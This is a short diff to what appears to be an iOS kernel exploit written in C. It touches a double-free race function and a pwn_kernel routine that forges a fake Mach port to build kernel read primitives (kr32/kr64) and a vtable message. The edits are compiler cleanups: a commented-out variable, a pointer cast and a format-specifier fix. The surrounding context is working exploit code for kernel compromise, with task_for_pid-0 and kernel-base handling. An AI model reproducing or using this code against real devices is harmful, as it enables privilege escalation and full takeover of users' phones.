@@ -68,7 +68,7 @@ bool should_run_race = true;
 
 void* double_free(void* a)
 {
-    uint64_t err;
+    // uint64_t err;
 
     int mode = LIO_NOWAIT;
     int nent = NENT;
@@ -554,10 +554,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t* tfp0, kptr_t* kbase, void* c
     uint64_t* kread_addr = (uint64_t*)(((uint64_t)fakeport) + 0xA8 + 0x8 + offsets.struct_offsets.ipr_size); // kread_addr now points to where ip_requests points + offset of ipr_size
 
     mach_msg_type_number_t out_sz = 1;
+
 #define kr32(addr, value)               \
     *kread_addr = addr;                 \
     kdata_write((const void*)fakeport); \
-    mach_port_get_attributes(mach_task_self(), the_one, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t) & value, &out_sz);
+    mach_port_get_attributes(mach_task_self(), the_one, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t) & value, (unsigned int*)&out_sz);
 
     uint32_t tmp_32read = 0;
 #define kr64(addr, value)         \
@@ -607,7 +608,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t* tfp0, kptr_t* kbase, void* c
     // 0x5d0 / 8 = 0xBA methods
     // we can round to 64-bit aligned by adding 0x6, 0xBA + 0x6 = 0xC0
     size_t vtab_msg_sz = sizeof(mach_msg_data_buffer_t) + (0xC0 * sizeof(uint64_t));
-    PWN_LOG("vtab msg size: %x", vtab_msg_sz);
+    PWN_LOG("vtab msg size: %zx", vtab_msg_sz);
 
     mach_msg_data_buffer_t* vtab_msg = (mach_msg_data_buffer_t*)malloc(vtab_msg_sz);
     bzero(vtab_msg, vtab_msg_sz);
